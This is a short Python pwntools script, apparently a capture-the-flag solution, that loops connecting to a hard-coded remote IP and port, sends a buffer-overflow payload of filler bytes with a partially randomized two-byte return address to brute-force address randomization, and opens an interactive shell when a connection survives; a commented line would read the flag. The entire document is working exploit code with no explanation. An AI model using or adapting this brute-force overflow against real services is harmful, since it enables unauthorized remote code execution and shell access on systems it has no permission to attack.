# one hand
from pwn import*
import time
# 
list1=[b'\x01',b'\x11',b'\x21',b'\x31',b'\x41',b'\x51',b'\x61',b'\x71',b'\x81',b'\x91',b'\xa1',b'\xb1',b'\xc1',b'\xd1',b'\xe1',b'\xf1']
i=0 
while True:
    i=i+1
    print(i)
    p=remote('8.130.110.158',2103)
    # p=process('./4')
    # gdb.attach(p)
    context.log_level='debug'
    bd=b'\xb1'+random.sample(list1,1)[0]
    payload=b'\x11\x11\xad\xde'*11+bd
    p.send(payload)
    print(hex(payload[-1]))
    print(hex(payload[-2]))
    # p.interactive()
    try:
        a=p.recv(timeout=1)
    except EOFError:     
        p.close()
        continue
    else:
        print(a)
        # p.send('cat flag')
        p.interactive()
        break


# 